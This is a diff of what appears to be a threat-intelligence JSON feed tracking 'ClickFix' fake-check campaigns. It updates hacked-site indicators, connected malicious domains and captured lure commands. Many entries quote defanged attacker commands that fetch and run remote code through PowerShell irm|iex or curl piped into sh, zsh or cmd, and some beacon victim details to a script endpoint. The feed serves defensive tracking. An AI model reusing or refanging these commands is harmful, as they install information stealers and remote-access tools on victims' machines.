@@ -5,7 +5,7 @@
   "short": "Fake checks that get victims to paste and run a command",
   "summary": "A fake CAPTCHA, browser update or error message, usually injected into a hacked legitimate website, copies a command to the clipboard and tells the victim to paste it into the Run dialog, a terminal or PowerShell. The command downloads and runs malware, typically an information stealer or a remote-access tool. Some campaigns fetch their next stage from a public blockchain so the hacked site never has to change."
  },
- "count": 4952,
+ "count": 4950,
  "indicators": [
   {
    "indicator": "1.234.27.94",
@@ -1440,11 +1440,13 @@
     "trek-72.com",
     "lepafonso.bz",
     "trustchecknes.com",
+    "t-trustresnew.com",
     "ncheck-brows.beer",
     "t-trustrest.com"
    ],
    "lure_from": [
-    "interseq.at"
+    "interseq.at",
+    "codes.browse-cdn.beer"
    ]
   },
   {
@@ -3994,6 +3996,7 @@
     "interseq.at",
     "efreitorher.org",
     "yaebalciganovvjopu.org",
+    "pizdalisibivet.org",
     "ciganshina.org",
     "pakistanskimalchik.org"
    ]
@@ -17351,7 +17354,9 @@
    "connects_to": [
     "ncheck-brows.beer"
    ],
-   "lure_from": []
+   "lure_from": [
+    "codes.browse-cdn.beer"
+   ]
   },
   {
    "indicator": "altacorporacion.com",
@@ -23342,7 +23347,10 @@
     "verifyidentrob01.cc",
     "ubbrobccheck20.cc"
    ],
-   "lure_from": []
+   "lure_from": [
+    "govrobczxc.cc",
+    "fudcomcheck.art"
+   ]
   },
   {
    "indicator": "arancerossecastellana.it",
@@ -26938,14 +26946,15 @@
    "actor_link": null,
    "commands": [
     "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
-    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null"
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
+    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex"
    ],
    "connects_to": [
-    "trustchecknes.com",
     "xorados.com",
     "hagosuro.lc",
     "trek-72.com",
+    "trustchecknes.com",
+    "t-trustresnew.com",
     "groverudder12.com"
    ],
    "lure_from": [
@@ -29924,11 +29933,13 @@
     "trek-72.com",
     "lepafonso.bz",
     "trustchecknes.com",
+    "t-trustresnew.com",
     "ncheck-brows.beer",
     "t-trustrest.com"
    ],
    "lure_from": [
-    "interseq.at"
+    "interseq.at",
+    "codes.browse-cdn.beer"
    ]
   },
   {
@@ -34033,7 +34044,10 @@
     "checkogosdfg33.cc",
     "verifyidentrob01.cc"
    ],
-   "lure_from": []
+   "lure_from": [
+    "govrobczxc.cc",
+    "fudcomcheck.art"
+   ]
   },
   {
    "indicator": "beautyavenue.us",
@@ -47835,60 +47849,6 @@
    "lure_from": []
   },
   {
-   "indicator": "cafecaproni.com.br",
-   "type": "domain",
-   "category": "clickfix",
-   "campaign": null,
-   "role": "Redirector",
-   "status": "online",
-   "first_seen": "2026-10-28",
-   "last_seen": "2026-10-30",
-   "last_online": "2026-11-07",
-   "offline_since": null,
-   "url": "http://cafecaproni.com.br/categoria-produto/cafes/",
-   "brand": null,
-   "product": null,
-   "hosting": "Oracle Cloud",
-   "dns": "Newfold",
-   "ip": "50.116.87.244",
-   "asn": "AS31898",
-   "org": "ORACLE-BMC-31898 - Oracle Corporation, US",
-   "country": "BR",
-   "ips": [
-    {
-     "ip": "50.116.87.244",
-     "asn": "AS31898",
-     "org": "ORACLE-BMC-31898 - Oracle Corporation, US",
-     "first_seen": "2026-10-28",
-     "last_seen": "2026-10-30"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "cafecaproni.com.br",
-     "status": "online",
-     "first_seen": "2026-10-28",
-     "last_seen": "2026-10-30"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/proliv2929' >/dev/null",
-    "(irm 'hxxps[:]//t-trustrest[.]com/proliv2929/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "(irm 'hxxps[:]//trustchecknes[.]com/proliv2929/[id]')|iex"
-   ],
-   "connects_to": [
-    "xorados.com",
-    "groverudder12.com",
-    "t-trustrest.com",
-    "trustchecknes.com"
-   ],
-   "lure_from": [
-    "interseq.at"
-   ]
-  },
-  {
    "indicator": "cafeduarte.com.br",
    "type": "domain",
    "category": "clickfix",
@@ -51226,15 +51186,16 @@
    "actor_link": "linked",
    "commands": [
     "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit",
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=100d73bb-5ce9-440a-9dbf-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fcasadeescola.com.br%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-03T15%3A31%3A15.866Z\"\" -d \"\"lastShellAt=2026-11-03T15%3A31%3A15.866Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\"",
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=5a7c12c4-8d0e-4e02-9bde-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fcasadeescola.com.br%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-10-31T00%3A29%3A56.080Z\"\" -d \"\"lastShellAt=2026-10-31T00%3A29%3A56.080Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\""
+    "curl -sL -d \"id=6ad90dbc-a7e0-4417-845a-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=https%3A%2F%2Fcasadeescola.com.br%2F&os=Mac%2015&lastVisitAt=2026-11-07T10%3A55%3A05.442Z&lastShellAt=2026-11-07T10%3A55%3A05.442Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\" && curl -s 'hxxps[:]//script-six-tawny[.]vercel[.]app/mac' -L | sh",
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=5c081f12-bbfe-4bb0-a20a-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fcasadeescola.com.br%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-07T10%3A39%3A44.932Z\"\" -d \"\"lastShellAt=2026-11-07T10%3A39%3A44.932Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\""
    ],
    "connects_to": [
     "fingerprint-veri.info"
    ],
    "lure_from": [
     "ncheck-brows.beer",
-    "codes.caffe-img.com"
+    "codes.caffe-img.com",
+    "codes.browse-cdn.beer"
    ]
   },
   {
@@ -58995,7 +58956,10 @@
     "verifyidentrob01.cc",
     "ubbrobccheck20.cc"
    ],
-   "lure_from": []
+   "lure_from": [
+    "govrobczxc.cc",
+    "fudcomcheck.art"
+   ]
   },
   {
    "indicator": "clubisho.ir",
@@ -63998,6 +63962,8 @@
    ],
    "lure_from": [
     "verifyidentrob01.cc",
+    "govrobczxc.cc",
+    "fudcomcheck.art",
     "checkogosdfg33.cc"
    ]
   },
@@ -66134,14 +66100,15 @@
    "actor_link": null,
    "commands": [
     "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
-    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null"
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
+    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex"
    ],
    "connects_to": [
     "hagosuro.lc",
-    "trustchecknes.com",
     "xorados.com",
     "trek-72.com",
+    "trustchecknes.com",
+    "t-trustresnew.com",
     "lepafonso.bz"
    ],
    "lure_from": [
@@ -74419,9 +74386,12 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "/bin/bash -c \"$(curl -A 'Mac OS X 10_15_7' -fsSL 'cm9c52gc[.]apartmentbusinessplan[.]com/?ublib=8bd8b452-c5d3-43ea-94f3-[id]')\"; echo \"\"BotGuard: Answer the protector challenge. Ref: 73282",
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/608-B8D3-712Fc1654E/849-b650-BC87849C3/B8-81-73-B6-DE-F4 | IEX"
    ],
-   "connects_to": [],
+   "connects_to": [
+    "cm9c52gc.apartmentbusinessplan.com"
+   ],
    "lure_from": []
   },
   {
@@ -79403,14 +79373,15 @@
    "actor_link": null,
    "commands": [
     "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
-    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null"
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
+    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex"
    ],
    "connects_to": [
     "hagosuro.lc",
-    "trustchecknes.com",
     "xorados.com",
-    "trek-72.com"
+    "trek-72.com",
+    "trustchecknes.com",
+    "t-trustresnew.com"
    ],
    "lure_from": [
     "interseq.at",
@@ -80345,7 +80316,9 @@
    "connects_to": [
     "ncheck-brows.beer"
    ],
-   "lure_from": []
+   "lure_from": [
+    "codes.browse-cdn.beer"
+   ]
   },
   {
    "indicator": "eddysdinerfrommalden.com",
@@ -94808,19 +94781,21 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "(irm 'hxxps[:]//cosmical2049[.]com/lom3/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
     "iex(irm 'hxxps[:]//copiose[.]org/lom/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})",
-    "curl -s $(echo \"[encoded]\" | base64 -d) | zsh"
+    "curl -s $(echo \"[encoded]\" | base64 -d) | zsh",
+    "(irm 'hxxps[:]//cosmical2049[.]com/lom3/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex"
    ],
    "connects_to": [
-    "cosmical2049.com",
     "copiose.org",
-    "escapeai.live"
+    "escapeai.live",
+    "cosmical2049.com",
+    "entitlementcheck.pro"
    ],
    "lure_from": [
     "cloudeccentric.cc",
     "makeverizyjar.info",
     "interseq.at",
+    "pizdalisibivet.org",
     "efreitorher.org",
     "yaebalciganovvjopu.org",
     "yaebaltakuyusety.com",
@@ -104341,9 +104316,12 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "/bin/bash -c \"$(curl -A 'Mac OS X 10_15_7' -fsSL 'mg2irfay[.]apartmentbusinessplan[.]com/?ublib=40581885-43b9-4e62-a7ad-[id]')\"; echo \"\"BotGuard: Answer the protector challenge. Ref: 73282",
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/608-B8D3-712Fc1654E/849-b650-BC87849C3/B8-81-73-B6-DE-F4 | IEX"
    ],
-   "connects_to": [],
+   "connects_to": [
+    "mg2irfay.apartmentbusinessplan.com"
+   ],
    "lure_from": []
   },
   {
@@ -106797,9 +106775,12 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "/bin/bash -c \"$(curl -A 'Mac OS X 10_15_7' -fsSL '34s8zhbc[.]apartmentbusinessplan[.]com/?ublib=59356d7e-4bf8-4c46-a6b4-[id]')\"; echo \"\"BotGuard: Answer the protector challenge. Ref: 73282",
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/608-B8D3-712Fc1654E/849-b650-BC87849C3/B8-81-73-B6-DE-F4 | IEX"
    ],
-   "connects_to": [],
+   "connects_to": [
+    "34s8zhbc.apartmentbusinessplan.com"
+   ],
    "lure_from": []
   },
   {
@@ -114918,7 +114899,8 @@
    ],
    "lure_from": [
     "interseq.at",
-    "ncheck-brows.beer"
+    "ncheck-brows.beer",
+    "codes.browse-cdn.beer"
    ]
   },
   {
@@ -115727,14 +115709,15 @@
    "actor_link": null,
    "commands": [
     "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
-    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null"
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
+    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex"
    ],
    "connects_to": [
     "hagosuro.lc",
-    "trustchecknes.com",
     "xorados.com",
-    "trek-72.com"
+    "trek-72.com",
+    "trustchecknes.com",
+    "t-trustresnew.com"
    ],
    "lure_from": [
     "interseq.at",
@@ -125096,9 +125079,12 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "/bin/bash -c \"$(curl -A 'Mac OS X 10_15_7' -fsSL 'xbcklfu4[.]apartmentbusinessplan[.]com/?ublib=c5b79b7e-7e25-4ec0-bd49-[id]')\"; echo \"\"BotGuard: Answer the protector challenge. Ref: 73282",
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/jkdjkjg374/47f8-b361-[id]/6FC-5B-20-FA-7C | IEX"
    ],
-   "connects_to": [],
+   "connects_to": [
+    "xbcklfu4.apartmentbusinessplan.com"
+   ],
    "lure_from": []
   },
   {
@@ -130572,9 +130558,12 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "/bin/bash -c \"$(curl -A 'Mac OS X 10_15_7' -fsSL 'z26jdry9[.]apartmentbusinessplan[.]com/?ublib=0e7de51a-d21d-4f74-9995-[id]')\"; echo \"\"BotGuard: Answer the protector challenge. Ref: 73282",
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/jkdjkjg374/47f8-b361-[id]/6FC-5B-20-FA-7C | IEX"
    ],
-   "connects_to": [],
+   "connects_to": [
+    "z26jdry9.apartmentbusinessplan.com"
+   ],
    "lure_from": []
   },
   {
@@ -136388,15 +136377,16 @@
    "actor": "dprk",
    "actor_link": "linked",
    "commands": [
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=05a4222b-0d1d-4ae3-805b-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fkeymessage.so%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-03T15%3A31%3A37.352Z\"\" -d \"\"lastShellAt=2026-11-03T15%3A31%3A37.352Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\"",
     "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit",
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=5f658b11-99d5-405a-a577-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fkeymessage.so%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-01T00%3A06%3A18.519Z\"\" -d \"\"lastShellAt=2026-11-01T00%3A06%3A18.519Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\""
+    "curl -sL -d \"id=2f478e22-31d1-47e0-8ff9-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=https%3A%2F%2Fkeymessage.so%2F&os=Mac%2015&lastVisitAt=2026-11-07T10%3A55%3A13.611Z&lastShellAt=2026-11-07T10%3A55%3A13.611Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\" && curl -s 'hxxps[:]//script-six-tawny[.]vercel[.]app/mac' -L | sh",
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=b84f9cd2-de75-410b-ab7f-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fkeymessage.so%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-07T10%3A41%3A11.939Z\"\" -d \"\"lastShellAt=2026-11-07T10%3A41%3A11.939Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\""
    ],
    "connects_to": [
     "fingerprint-veri.info"
    ],
    "lure_from": [
-    "ncheck-brows.beer"
+    "ncheck-brows.beer",
+    "codes.browse-cdn.beer"
    ]
   },
   {
@@ -138013,9 +138003,12 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "/bin/bash -c \"$(curl -A 'Mac OS X 10_15_7' -fsSL 'wqyjn8jm[.]apartmentbusinessplan[.]com/?ublib=9edaa01b-bbcd-4df1-a8ce-[id]')\"; echo \"\"BotGuard: Answer the protector challenge. Ref: 73282",
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/jkdjkjg374/47f8-b361-[id]/6FC-5B-20-FA-7C | IEX"
    ],
-   "connects_to": [],
+   "connects_to": [
+    "wqyjn8jm.apartmentbusinessplan.com"
+   ],
    "lure_from": []
   },
   {
@@ -139764,6 +139757,7 @@
     "xorados.com",
     "trek-72.com",
     "trustchecknes.com",
+    "t-trustresnew.com",
     "t-trustrest.com"
    ],
    "lure_from": [
@@ -142355,7 +142349,8 @@
    "commands": [],
    "connects_to": [],
    "lure_from": [
-    "ncheck-brows.beer"
+    "ncheck-brows.beer",
+    "codes.browse-cdn.beer"
    ]
   },
   {
@@ -145127,15 +145122,16 @@
    "actor_link": "linked",
    "commands": [
     "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit",
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=f17e78f6-9584-4385-8f43-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fwww.liftingbarriers.org%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-03T15%3A31%3A16.535Z\"\" -d \"\"lastShellAt=2026-11-03T15%3A31%3A16.535Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\"",
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=0a15e03f-99c5-4ad7-8bfe-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fwww.liftingbarriers.org%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-10-31T00%3A29%3A59.691Z\"\" -d \"\"lastShellAt=2026-10-31T00%3A29%3A59.691Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\""
+    "curl -sL -d \"id=634c708c-0b9f-4b4a-b951-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=https%3A%2F%2Fwww.liftingbarriers.org%2F&os=Mac%2015&lastVisitAt=2026-11-07T10%3A55%3A00.557Z&lastShellAt=2026-11-07T10%3A55%3A00.557Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\" && curl -s 'hxxps[:]//script-six-tawny[.]vercel[.]app/mac' -L | sh",
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=a4126048-b169-478e-af0e-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fwww.liftingbarriers.org%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-07T10%3A39%3A41.323Z\"\" -d \"\"lastShellAt=2026-11-07T10%3A39%3A41.323Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\""
    ],
    "connects_to": [
     "fingerprint-veri.info",
     "ncheck-brows.beer"
    ],
    "lure_from": [
-    "codes.caffe-img.com"
+    "codes.caffe-img.com",
+    "codes.browse-cdn.beer"
    ]
   },
   {
@@ -160887,9 +160883,12 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "/bin/bash -c \"$(curl -A 'Mac OS X 10_15_7' -fsSL 'b7hwa6yx[.]apartmentbusinessplan[.]com/?ublib=2961aeab-5992-4ab2-bc2b-[id]')\"; echo \"\"BotGuard: Answer the protector challenge. Ref: 73282",
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/jkdjkjg374/47f8-b361-[id]/6FC-5B-20-FA-7C | IEX"
    ],
-   "connects_to": [],
+   "connects_to": [
+    "b7hwa6yx.apartmentbusinessplan.com"
+   ],
    "lure_from": []
   },
   {
@@ -163532,9 +163531,12 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "/bin/bash -c \"$(curl -A 'Mac OS X 10_15_7' -fsSL 'oy7iwhiy[.]apartmentbusinessplan[.]com/?ublib=badc7017-8399-4c60-8ccd-[id]')\"; echo \"\"BotGuard: Answer the protector challenge. Ref: 73282",
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/jkdjkjg374/47f8-b361-[id]/6FC-5B-20-FA-7C | IEX"
    ],
-   "connects_to": [],
+   "connects_to": [
+    "oy7iwhiy.apartmentbusinessplan.com"
+   ],
    "lure_from": []
   },
   {
@@ -177300,15 +177302,16 @@
    "actor_link": "linked",
    "commands": [
     "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit",
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=d7acf74d-fd62-4c17-93e6-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fperucio.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-03T15%3A30%3A54.446Z\"\" -d \"\"lastShellAt=2026-11-03T15%3A30%3A54.446Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\"",
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=3fb96e7c-777f-4b1c-a50e-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fperucio.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-10-31T00%3A29%3A50.996Z\"\" -d \"\"lastShellAt=2026-10-31T00%3A29%3A50.996Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\""
+    "curl -sL -d \"id=4cbd8025-1e30-43ee-a70b-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=https%3A%2F%2Fperucio.com%2F&os=Mac%2015&lastVisitAt=2026-11-07T10%3A54%3A50.555Z&lastShellAt=2026-11-07T10%3A54%3A50.555Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\" && curl -s 'hxxps[:]//script-six-tawny[.]vercel[.]app/mac' -L | sh",
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=c8c7a3a4-dda0-4c7c-989f-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fperucio.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-07T10%3A39%3A29.544Z\"\" -d \"\"lastShellAt=2026-11-07T10%3A39%3A29.544Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\""
    ],
    "connects_to": [
     "fingerprint-veri.info"
    ],
    "lure_from": [
     "ncheck-brows.beer",
-    "codes.caffe-img.com"
+    "codes.caffe-img.com",
+    "codes.browse-cdn.beer"
    ]
   },
   {
@@ -186506,7 +186509,8 @@
     "govrobczxc.cc"
    ],
    "lure_from": [
-    "verifyidentrob01.cc"
+    "verifyidentrob01.cc",
+    "fudcomcheck.art"
    ]
   },
   {
@@ -189334,18 +189338,19 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "(irm 'hxxps[:]//cosmical2049[.]com/lom3/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
     "iex(irm 'hxxps[:]//copiose[.]org/lom/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})",
-    "curl -s $(echo \"[encoded]\" | base64 -d) | zsh"
+    "curl -s $(echo \"[encoded]\" | base64 -d) | zsh",
+    "(irm 'hxxps[:]//cosmical2049[.]com/lom3/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex"
    ],
    "connects_to": [
-    "cosmical2049.com",
     "copiose.org",
-    "escapeai.live"
+    "escapeai.live",
+    "cosmical2049.com"
    ],
    "lure_from": [
     "cloudeccentric.cc",
     "interseq.at",
+    "pizdalisibivet.org",
     "efreitorher.org",
     "yaebalciganovvjopu.org",
     "yaebaltakuyusety.com",
@@ -190108,61 +190113,6 @@
    ],
    "connects_to": [],
    "lure_from": []
-  },
-  {
-   "indicator": "renewmedspabeauty.com",
-   "type": "domain",
-   "category": "clickfix",
-   "campaign": null,
-   "role": "Redirector",
-   "status": "online",
-   "first_seen": "2026-11-02",
-   "last_seen": "2026-11-03",
-   "last_online": "2026-11-07",
-   "offline_since": null,
-   "url": "https://renewmedspabeauty.com/",
-   "brand": null,
-   "product": null,
-   "hosting": "Oracle Cloud",
-   "dns": "Newfold",
-   "ip": "50.6.153.148",
-   "asn": "AS31898",
-   "org": "ORACLE-BMC-31898 - Oracle Corporation, US",
-   "country": "US",
-   "ips": [
-    {
-     "ip": "50.6.153.148",
-     "asn": "AS31898",
-     "org": "ORACLE-BMC-31898 - Oracle Corporation, US",
-     "first_seen": "2026-11-02",
-     "last_seen": "2026-11-03"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "renewmedspabeauty.com",
-     "status": "online",
-     "first_seen": "2026-11-02",
-     "last_seen": "2026-11-03"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex",
-    "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null"
-   ],
-   "connects_to": [
-    "trustchecknes.com",
-    "hagosuro.lc",
-    "xorados.com",
-    "trek-72.com"
-   ],
-   "lure_from": [
-    "interseq.at",
-    "ncheck-brows.beer"
-   ]
   },
   {
    "indicator": "renovation-lca.fr",
@@ -203935,12 +203885,13 @@
    "commands": [
     "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
-    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex"
+    "(irm 'hxxps[:]//t-trustresnew[.]com/dan_proliv/[id]')|iex"
    ],
    "connects_to": [
     "hagosuro.lc",
     "xorados.com",
     "trek-72.com",
+    "t-trustresnew.com",
     "trustchecknes.com",
     "t-trustrest.com"
    ],
@@ -206634,7 +206585,9 @@
    "lure_from": [
     "ncheck-brows.beer",
     "verifyidentrob01.cc",
-    "govrobczxc.cc"
+    "govrobczxc.cc",
+    "codes.browse-cdn.beer",
+    "fudcomcheck.art"
    ]
   },
   {
@@ -211405,15 +211358,16 @@
    "actor_link": "linked",
    "commands": [
     "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit",
